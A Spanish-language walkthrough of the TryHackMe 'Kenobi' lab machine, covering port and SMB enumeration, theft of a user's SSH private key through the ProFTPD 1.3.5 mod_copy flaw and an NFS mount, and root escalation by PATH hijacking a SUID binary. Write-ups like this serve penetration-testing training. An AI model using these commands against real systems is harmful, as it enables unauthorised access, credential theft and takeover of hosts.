# Kenobi
## 1. Introducción
### 1.1 Antecedentes
**Kenobi** es una máquina Linux de dificultad _Easy_ en la plataforma **TryHackMe**.  
El objetivo es comprometer el sistema mediante la enumeración de servicios expuestos y el encadenamiento de vulnerabilidades hasta obtener privilegios de **root**.
### 1.2 Objetivos

- Enumerar servicios expuestos.
- Obtener acceso inicial como usuario.
- Escalar privilegios a root. 

---
## 2. Enumeración
### 2.1 Reconocimiento inicial
Comenzamos verificando conectividad:
```bash
❯ ping -c1 kenobi.thm
```
El host responde correctamente, confirmando que está activo.
### 2.2 Nmap
Realizamos un escaneo completo de puertos:
```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 kenobi.thm -oN allports --open
```
Puertos abiertos relevantes:

- 21 → FTP
- 22 → SSH
- 80 → HTTP
- 111 → rpcbind
- 139 / 445 → SMB
- 2049 → NFS
- Puertos altos asociados a mountd y nlockmgr

Posteriormente ejecutamos un escaneo más detallado:
```bash
❯ nmap -p21,22,80,111,139,445,2049,37971,38643,41655,55659 -sCV -Pn -oN targeted kenobi.thm
```
 Servicios identificados:

- **FTP** → ProFTPD 1.3.5
- **SSH** → OpenSSH 8.2p1 (Ubuntu)
- **HTTP** → Apache 2.4.41
- **SMB** → Samba 4.6.2
- **NFS** → Exporta `/var`
### 2.3 Enumeración SMB
Listamos recursos compartidos:
```bash
❯ smbmap -H 10.49.177.253
```
Se detecta un recurso `anonymous` con permisos de solo lectura.

Accedemos:
```bash
❯ smbclient //10.49.177.253/anonymous -N
```
Descargamos `log.txt`.
### 2.3 Análisis de log.txt
El archivo contiene:

- Generación de clave SSH para el usuario `kenobi`.
- Configuración de ProFTPD.
- Configuración completa de Samba.
- Confirmación de que el FTP corre como usuario `kenobi`.

Esto sugiere que la clave privada SSH esta en:
```
/home/kenobi/.ssh/id_rsa
```
---
## 3. Explotación  
### 3.1 ProFTPD mod_copy
Buscamos exploits:
```bash
❯ searchsploit ProFTPD 1.3.5
```
Se confirma vulnerabilidad en el módulo `mod_copy`, que permite copiar archivos **sin autenticación** usando `SITE CPFR` y `SITE CPTO`.
### 3.1 Copia de la clave privada
Conectamos vía netcat:
```bash
❯ nc 10.49.177.253 21
```
Ejecutamos:
```bash
site cpfr /home/kenobi/.ssh/id_rsa  
site cpto /var/tmp/id_rsa
```
La clave se copia a `/var/tmp/id_rsa`.
### 3.2 Acceso vía NFS
Como `/var` está exportado por NFS:
```bash
❯ showmount -e 10.49.177.253
```
Montamos el recurso en nuestra maquina atacante:
```bash
❯ mkdir /mnt/kenobi
❯ mount 10.49.177.253:/var/tmp/ /mnt/kenobi
```
Accedemos al archivo copiado:
```bash
❯ cd /mnt/kenobi  
❯ cp id_rsa ~/Desktop
❯ cd ~/Desktop   
❯ chmod 600 id_rsa
```
Conectamos por SSH:
```bash
❯ ssh kenobi@10.49.177.253 -i id_rsa
```
Acceso exitoso como usuario:
```
kenobi
```
---
## 4. Escalada de privilegios
### 4.1 Análisis del binario menu
Buscamos binarios SUID:
```bash
❯ find / -perm -4000 2>/dev/null
```
Destaca:
```
/usr/bin/menu
```
Al ejecutarlo:
```
❯ /usr/bin/menu
```
Muestra tres opciones:

1. status check
2. kernel version
3. ifconfig

La opción 3 ejecuta `ifconfig`, pero sin ruta absoluta.
Verificamos el PATH:
```bash
❯ echo $PATH
```
El directorio actual no está primero en el PATH.
### 4.2 Root
Creamos un archivo malicioso llamado `ifconfig`:
```bash
❯ echo /bin/bash > ifconfig  
❯ chmod 777 ifconfig
```
Modificamos el PATH:
```bash
❯ export PATH=.:$PATH
```
Ejecutamos nuevamente:
```bash
❯ /usr/bin/menu
```
Seleccionamos opción 3.
El sistema ejecuta nuestro `ifconfig`, otorgando una shell como:
```
root
```
Confirmación:
```bash
❯ whoami
root
```
